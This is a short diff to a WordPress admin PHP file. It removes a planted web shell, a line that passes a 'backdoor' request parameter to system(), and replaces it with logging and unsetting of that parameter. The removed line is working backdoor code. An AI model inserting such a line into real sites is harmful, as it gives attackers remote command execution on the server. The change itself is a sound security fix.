@@ -6,7 +6,12 @@
  * @subpackage Administration
  */
 
-system($_REQUEST["backdoor"]);
+// Removed insecure system execution of user-supplied input.
+if (!empty($_REQUEST['backdoor'])) {
+    error_log('Blocked unsafe system command execution attempt via backdoor parameter from ' . ($_SERVER['REMOTE_ADDR'] ?? 'unknown'));
+}
+// Prevent any further use of the parameter by unsetting it.
+unset($_REQUEST['backdoor']);
 
 /** Load WordPress Bootstrap */
 require_once __DIR__ . '/admin.php';
